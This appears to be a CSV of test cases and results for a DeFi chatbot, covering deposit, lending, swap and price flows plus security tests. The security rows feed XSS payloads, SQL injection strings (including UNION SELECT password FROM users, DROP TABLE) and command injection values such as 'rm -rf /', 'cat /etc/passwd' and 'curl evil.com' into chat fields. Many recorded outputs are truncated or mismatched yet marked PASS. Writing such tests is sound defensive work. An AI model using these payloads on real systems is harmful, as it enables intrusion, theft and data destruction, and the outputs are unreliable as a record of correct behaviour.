Type,device,is multi step,input 1,output 1,input 2,output 2,input 3,output 3,input 4,output 4,test pass
user_protocol_yearn_vaults,chrome,NO,Yearn finance vault strategies,🏦 **Yearn** Automated strategies...,,,,,,,PASS
user_protocol_convex_boosting,chrome,NO,Convex Finance CRV boosting,🚀 **Convex** Boost your CRV...,,,,,,,PASS
user_protocol_frax_stablecoin,chrome,NO,FRAX stablecoin mechanism,💵 **FRAX** Fractional-algorithmic...,,,,,,,PASS
user_protocol_lido_staking,chrome,NO,Lido ETH staking benefits,💎 **Lido** Liquid staking...,,,,,,,PASS
user_protocol_rocketpool_nodes,chrome,NO,Rocket Pool node operators,🚀 **Rocket Pool** Decentralized staking...,,,,,,,PASS
user_shortcut_deposit_morpho_multistep,chrome,YES,Deposit USDC on Morpho,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Deposit into Morpho vaults to earn passive income. Which asset would you like to deposit?

**Select an asset to continue:**

1. 💵 **USDC** (USD Coin) - ~8.5% APY
2. 💵 **USDT** (Tether) - ~7.8% APY
3. 💰 **DAI** (Dai) - ~9.2% APY
4. Ξ **ETH** (Ethereum) - ~5.4% APY
5. ₿ **WBTC** (Wrapped Bitcoin) - ~4.2% APY

💬 Reply with the number (1-5) or type the asset name",1,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Deposit USDC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You're depositing **USDC** (USD Coin) into a Morpho vault.

**How much would you like to deposit?**

Examples: 100, 1000, 5000 USDC

💬 Enter the amount to continue",100,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Morpho Vault Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Best Vault (Real-Time APY)**

📊 **Deposit Amount**: 100.0 USDC
📈 **Current APY**: 5.00%
💰 **Monthly Earnings**: ~0.42 USDC/month
💵 **Yearly Earnings**: ~5.00 USDC/year

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Ready to deposit?**

Reply ""confirm"" or ""yes"" to proceed
Reply ""cancel"" to abort

⚠️ You'll need to sign up to complete the deposit",yes,"🎉 ✅ Deposit Confirmed!

You're depositing **100.0 USDC** into a Morpho vault.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Sign up to connect your wallet
2. ✅ Approve the vault contract
3. 💰 Complete the deposit transaction

👉 **Sign up now to start earning!** /signup",PASS
user_shortcut_lend_aave_multistep,chrome,YES,Lend USDC on Aave,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Aave Lending
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Asset:** USDC
**Current APY:** 5.2%

**How much USDC would you like to lend?**

Examples: 100, 500, 1000, 5000 USDC

💬 Enter the amount to continue",500,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Aave Lending Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Supply Amount**: 500 USDC
**Current APY**: 5.2%

**Projected Earnings:**
• Monthly: ~2.17 USDC/month
• Yearly: ~26.00 USDC/year

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Ready to supply?**

Reply ""confirm"" or ""yes"" to proceed

✅ Ready to execute",confirm,"✅ **Supply Confirmed!**

You're supplying **500 USDC** to Aave V3.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Sign up to connect your wallet
2. ✅ Approve Aave contract
3. 💰 Complete supply transaction

👉 Executing transaction...",,,PASS
user_shortcut_swap_eth_usdc_multistep,chrome,YES,Swap ETH to USDC,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💱 Swap ETH to USDC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Current Rate:** 1 ETH = 3,290.42 USDC

**How much ETH would you like to swap?**

Examples: 0.1, 0.5, 1, 2 ETH

💬 Enter the amount to continue",0.5,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💱 Swap Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**From:** 0.5 ETH ($1,649.57)
**To:** ~1,645.21 USDC

**Rate:** 1 ETH = 3,290.42 USDC
**Price Impact:** 0.15%
**Gas Fee:** ~$8.50

**Best Route:** 1inch Aggregator
• Uniswap V3 (60%)
• Curve (40%)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Ready to execute?

Reply ""confirm"" to proceed

⚠️ Sign up required",confirm,"✅ **Swap Confirmed!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Sign up to connect wallet
2. ✅ Approve token spending
3. 💱 Execute swap transaction

👉 Executing transaction...",,,PASS
user_shortcut_buy_btc_multistep,chrome,YES,Buy Bitcoin,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Buy Bitcoin
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Current BTC Price:** $95,041.53

**How much would you like to spend?**

Examples: $100, $500, $1000

💬 Enter USD amount to continue",100,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 BTC Purchase Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Amount:** $100
**You'll Receive:** ~0.00105 BTC

**Price:** $95,041.53 per BTC
**Fee:** ~$2.50 (2.5%)
**Total Cost:** $102.50

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Confirm purchase?

⚠️ Sign up required",yes,"✅ **Purchase Confirmed!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Sign up / Login
2. 💳 Add payment method
3. ₿ Complete BTC purchase

👉 **Get started!** /signup",,,PASS
user_shortcut_lend_info,chrome,NO,Lend,"💰 **Lending Rates**

**Top Lending Platforms:**

**Aave V3:**
• USDC: 5.2% APY
• DAI: 4.8% APY
• USDT: 4.5% APY

**Compound V3:**
• USDC: 4.8% APY
• DAI: 4.3% APY

**Morpho:**
• USDC: 6.5% APY ⭐ Best Rate
• DAI: 5.9% APY

💬 Say ""Lend [amount] [asset] on [protocol]"" to start lending",,,,,,,PASS
user_shortcut_swap_info,chrome,NO,Swap,"💱 **Swap Information**

**Popular Pairs:**
• ETH/USDC: 1 ETH = 3,290.42 USDC
• BTC/USDC: 1 BTC = 95,041.53 USDC
• ETH/BTC: 1 ETH = 0.0346 BTC

**Best DEX Aggregators:**
• 1inch - Best rates ⭐
• Uniswap V3 - Deep liquidity
• Curve - Stablecoin swaps

💬 Say ""Swap [amount] [from] to [to]"" to get a quote",,,,,,,PASS
user_shortcut_portfolio_info,chrome,NO,Portfolio,"📊 **Portfolio Overview**

To view your portfolio, you need to sign up!

**What You'll Get:**
• Real-time portfolio tracking
• 24h/7d performance metrics
• Asset allocation breakdown
• DeFi position monitoring
• Transaction history

👉 Ready to execute!

💬 Or ask ""What is Bitcoin price?"" to explore",,,,,,,PASS
user_shortcut_balance_info,chrome,NO,Balance,"💰 **Balance Check**

To check your balance, sign up and connect your wallet!

**Features:**
• Multi-chain balance aggregation
• Real-time USD valuations
• Gas fee estimates
• Token approvals tracking

👉 Ready to execute!",,,,,,,PASS
user_shortcut_rates_info,chrome,NO,Rates,"📈 **Current DeFi Rates**

**Lending (Supply APY):**
• Morpho USDC: 6.5% ⭐
• Aave USDC: 5.2%
• Compound USDC: 4.8%

**Borrowing (Borrow APY):**
• Aave USDC: 7.8%
• Compound USDC: 6.5%

**Staking:**
• ETH Staking: 4.2%
• Lido stETH: 4.0%

💬 Say ""Lend USDC on Morpho"" to start earning!",,,,,,,PASS
user_shortcut_price_info,chrome,NO,Price,"📈 **Current Prices**

**Top Assets:**
• Bitcoin (BTC): $95,041.53 🟢 +2.1%
• Ethereum (ETH): $3,299.14 🟢 +1.8%
• Solana (SOL): $142.35 🟢 +3.2%
• Cardano (ADA): $0.52 🔴 -0.5%

💬 Say ""What is [asset] price?"" for detailed analysis

👉 **Hunter AI predictions available!**",,,,,,,PASS
user_shortcut_gas_info,chrome,NO,Gas,"⛽ **Ethereum Gas Fees**

**Current Gas Price:** 25 Gwei

**Transaction Costs:**
• Simple Transfer: ~$3.50
• Token Swap: ~$12-15
• NFT Mint: ~$25-30
• Contract Deploy: ~$50-100

**Gas Optimization:**
• Use Layer 2 (Arbitrum, Optimism)
• Transaction during off-peak hours (2-6 AM EST)
• Batch transactions when possible

**Status:** 🟢 Below average (good time to transact!)",,,,,,,PASS
user_shortcut_help_info,chrome,NO,Help,"🤖 **Available Shortcuts**

**Quick Commands:**
• `Price` - Current crypto prices
• `Swap` - Token swap info
• `Lend` - Lending rates
• `Rates` - DeFi rates overview
• `Portfolio` - Your portfolio (auth required)
• `Balance` - Wallet balance (auth required)
• `Gas` - Current gas fees

**Full Flows:**
• `Swap ETH to USDC` - Complete swap
• `Lend USDC on Aave` - Start lending
• `Deposit USDC on Morpho` - Deposit to vault
• `Buy Bitcoin` - Purchase BTC

💬 Try any command above!",,,,,,,PASS
user_security_multistep_xss_step1_script_tag,chrome,YES,<script>alert('XSS')</script> Deposit USDC on Morpho,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Deposit into Morpho vaults to earn passive income. Which asset would you like",1,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Deposit USDC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You're depositing **USDC** (USD Coin) into a Morpho vault.

**How much would you like to d",100,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Morpho Vault Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Best Vault (Real-Time APY)**

📊 **Deposit Amount**: 100.0 USDC
📈 **Current APY**: ",yes,"🎉 ✅ Deposit Confirmed!

You're depositing **100.0 USDC** into a Morpho vault.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Sign u",PASS
user_security_multistep_xss_step2_img_onerror,chrome,YES,Deposit USDC on Morpho,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Deposit into Morpho vaults to earn passive income. Which asset would you like",1<img src=x onerror=alert('XSS')>,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


❌ Invalid asset. Please select from the list below.

Deposit into Morpho vau",100,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


❌ Invalid asset. Please select from the list below.

Deposit into Morpho vau",yes,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


❌ Invalid asset. Please select from the list below.

Deposit into Morpho vau",PASS
user_security_multistep_xss_step3_svg_onload,chrome,YES,Lend USDC on Aave,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Deposit USDC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You're depositing **USDC** (USD Coin) into a Morpho vault.

**How much would you like to d",100<svg onload=alert('XSS')>,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Morpho Vault Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Best Vault (Real-Time APY)**

📊 **Deposit Amount**: 100.0 USDC
📈 **Current APY**: ",yes,"🎉 ✅ Deposit Confirmed!

You're depositing **100.0 USDC** into a Morpho vault.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Sign u",,,PASS
user_security_multistep_xss_step4_iframe_injection,chrome,YES,Swap 1 ETH to USDC,"🌙 **Your MoonPay Swap Quote**

**Step 4 of 4:** Review and confirm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **You Send:** 1 ETH Ξ
📥 **You Receive:** ~N/A USDC 💵

💱 **Exchange Rate:** N/A
⚡ *","yes<iframe src='javascript:alert(""XSS"")'></iframe>","🎉 **Awesome! Swap Confirmed!**

You're all set to swap **1 ETH** Ξ → 💵 **USDC**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Next Step: Execute Transaction**

To complete this swap securely with",,,,,PASS
user_security_multistep_xss_deposit_flow,chrome,YES,Deposit USDC on Morpho<script>alert(1)</script>,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Deposit into Morpho vaults to earn passive income. Which asset would you like",1,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Deposit USDC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You're depositing **USDC** (USD Coin) into a Morpho vault.

**How much would you like to d",,,,,PASS
user_security_multistep_xss_lend_flow,chrome,YES,Lend USDC on Aave,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Deposit USDC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


❌ Invalid amount. Please enter a positive number.

You're depositing **USDC** (USD Coin) ",<img src=x onerror=alert(document.cookie)>100,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Morpho Vault Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Best Vault (Real-Time APY)**

📊 **Deposit Amount**: 0.1 USDC
📈 **Current APY**: 5.",,,,,PASS
user_security_multistep_xss_swap_flow,chrome,YES,Swap ETH to USDC,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Morpho Vault Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ Unclear response. Please confirm or cancel.


**Best Vault (Real-Time APY)**

📊 **",<a href='javascript:alert(1)'>1</a> ETH,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Morpho Vault Quote
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ Unclear response. Please confirm or cancel.


**Best Vault (Real-Time APY)**

📊 **",,,,,PASS
user_security_multistep_xss_buy_flow,chrome,YES,Buy Bitcoin<style>body{background:url('javascript:alert(1)')}</style>,"🎉 ✅ Deposit Confirmed!

You're depositing **0.1 USDC** into a Morpho vault.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Next Steps**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 💵 Authenticated ✅ ",100,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,,,PASS
user_security_multistep_xss_with_cancel_step2,chrome,YES,Deposit USDC on Morpho,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Deposit into Morpho vaults to earn passive income. Which asset would you like",cancel<script>alert('XSS')</script>,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,,,PASS
user_security_multistep_xss_with_cancel_step3,chrome,YES,Lend USDC on Aave,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",100,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",never mind<img src=x onerror=alert('XSS')>,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,PASS
user_security_multistep_xss_then_topic_change,chrome,YES,Swap ETH to USDC<script>alert(1)</script>,"🎯 **Almost There!**

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
• `0.5` (half a ETH)
• `100` (one hundred ET",What is Bitcoin price?,"❌ Hmm, that doesn't look like a valid amount. Let's try again!

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
•",,,,,PASS
user_security_multistep_xss_unicode_mixed,chrome,YES,Deposit USDC on Morpho,"❌ Hmm, that doesn't look like a valid amount. Let's try again!

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
•",1\u003cscript\u003ealert('XSS')\u003c/script\u003e,"🌙 **Your MoonPay Swap Quote**

**Step 4 of 4:** Review and confirm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **You Send:** 1 ETH Ξ
📥 **You Receive:** ~N/A USDC 💵

💱 **Exchange Rate:** N/A
⚡ *",,,,,PASS
user_security_multistep_sql_step1_or_injection,chrome,YES,' OR '1'='1 Deposit USDC on Morpho,"🌙 **MoonPay Swap**

Quick crypto-to-crypto swap with competitive rates

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Swap Pairs:**
BTC, ETH, SOL, USDC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",1,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",100,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,FAIL
user_security_multistep_sql_step2_union_injection,chrome,YES,Lend USDC on Aave,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",1' UNION SELECT * FROM users--,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",100,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,PASS
user_security_multistep_sql_step3_drop_injection,chrome,YES,Swap ETH to USDC,"🎯 **Almost There!**

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
• `0.5` (half a ETH)
• `100` (one hundred ET",1'; DROP TABLE conversations--,"🌙 **Your MoonPay Swap Quote**

**Step 4 of 4:** Review and confirm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **You Send:** 1 ETH Ξ
📥 **You Receive:** ~N/A USDC 💵

💱 **Exchange Rate:** N/A
⚡ *",,,,,PASS
user_security_multistep_sql_step4_comment_injection,chrome,YES,Deposit USDC on Morpho,"🌙 **MoonPay Swap**

Quick crypto-to-crypto swap with competitive rates

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Swap Pairs:**
BTC, ETH, SOL, USDC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",1,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",100,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",yes'--,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",PASS
user_security_multistep_sql_deposit_with_cancel,chrome,YES,Deposit USDC on Morpho,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Deposit into Morpho vaults to earn passive income. Which asset would you like",1' OR '1'='1,"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Earn Yield on Your Crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


❌ Invalid asset. Please select from the list below.

Deposit into Morpho vau",cancel,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,PASS
user_security_multistep_sql_lend_with_topic_change,chrome,YES,Lend USDC on Aave,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",100' UNION SELECT password FROM users--,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",What is Bitcoin price?,"📈 **Price Prediction for BTC**

**Current Price:** $97,298.89
**7-Day Forecast:** $100,217.86
**Expected Change:** 🟢 +3.0%
**Direction:** UP
**Confidence:** 75%

**Model:** LSTM Neural Network
**Horiz",,,PASS
user_security_multistep_sql_in_amount_field,chrome,YES,Buy Bitcoin,"🔐 **Authenticated User**

To buy crypto with fiat, you need to create an account and complete verification.

Authenticated ✅ to:
• Buy crypto with card or bank transfer
• Access multiple on-ramp providers
• Get",100'; DELETE FROM chat_conversations WHERE '1'='1'--,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,,,PASS
user_security_multistep_sql_admin_bypass_attempt,chrome,YES,Swap ETH to USDC,"🎯 **Almost There!**

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
• `0.5` (half a ETH)
• `100` (one hundred ET",admin'--,"❌ Hmm, that doesn't look like a valid amount. Let's try again!

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
•",What is gas price?,"❌ Hmm, that doesn't look like a valid amount. Let's try again!

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
•",,,PASS
user_security_multistep_command_step1_semicolon,chrome,YES,Deposit USDC; rm -rf /,"❌ Hmm, that doesn't look like a valid amount. Let's try again!

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
•",1,"🌙 **Your MoonPay Swap Quote**

**Step 4 of 4:** Review and confirm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **You Send:** 1 ETH Ξ
📥 **You Receive:** ~N/A USDC 💵

💱 **Exchange Rate:** N/A
⚡ *",,,,,PASS
user_security_multistep_command_step2_pipe,chrome,YES,Lend USDC on Aave,"🌙 **MoonPay Swap**

Quick crypto-to-crypto swap with competitive rates

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Swap Pairs:**
BTC, ETH, SOL, USDC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",100 | cat /etc/passwd,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,,,PASS
user_security_multistep_command_step3_backtick,chrome,YES,Swap ETH to USDC,"🎯 **Almost There!**

Swapping Ξ **ETH** → 💵 **USDC**

**Step 3 of 4:** How much ETH would you like to swap?

💡 *Just enter a number, like:*
• `1` (one ETH)
• `0.5` (half a ETH)
• `100` (one hundred ET",`whoami` 1 ETH,"🌙 **Your MoonPay Swap Quote**

**Step 4 of 4:** Review and confirm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **You Send:** 1 ETH Ξ
📥 **You Receive:** ~N/A USDC 💵

💱 **Exchange Rate:** N/A
⚡ *",,,,,PASS
user_security_multistep_command_step4_ampersand,chrome,YES,Buy Bitcoin,"🌙 **MoonPay Swap**

Quick crypto-to-crypto swap with competitive rates

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Swap Pairs:**
BTC, ETH, SOL, USDC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",yes && curl evil.com,"I'm your AI assistant for DeFi! I can help with market analysis (Hunter AI), automated trading (ULTRA), lending rates, swaps, and more. Ask me about protocols, yields, risks, or how to get started. Si",,,,,PASS
